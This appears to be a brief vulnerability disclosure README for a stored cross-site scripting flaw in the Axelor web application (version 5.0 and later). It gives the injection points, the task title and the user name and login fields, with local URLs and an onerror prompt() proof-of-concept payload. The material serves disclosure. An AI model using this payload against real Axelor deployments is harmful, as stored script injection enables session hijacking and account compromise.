# Axelor_Stored_XSS
Stored_XSS_axelor_WebApp

Product : AXELOR

Version : > / = 5.0

Vulnerable parameters = *

Exemple : 
```
Section "teamwork"
Add new task and put the payload in the title.

PARAM : name
payload : <img/src/onerror=prompt(666)>
URL : http://192.168.0.30:8080/#/ds/team.tasks.assigned/list/1
```
Other one :
```
Section Administration / User Management / Users

URL : http://192.168.0.30:8080/#/ds/action-auth-users/edit/4

Register an new user with the parameters as follow : 
	name = <img/src/onerror=prompt(666)>
	login ("code" parameter in the request) = <img/src/onerror=prompt(666)>

Get XSSED When visiting the Users view : http://192.168.0.30:8080/#/ds/action-auth-users/list/1
```


Payload for demonstration use : 
```
<img/src/onerror=prompt(1)>
```


![](https://user-images.githubusercontent.com/61753065/153757772-185eee39-c55a-4b00-abff-b051753a0a01.gif)
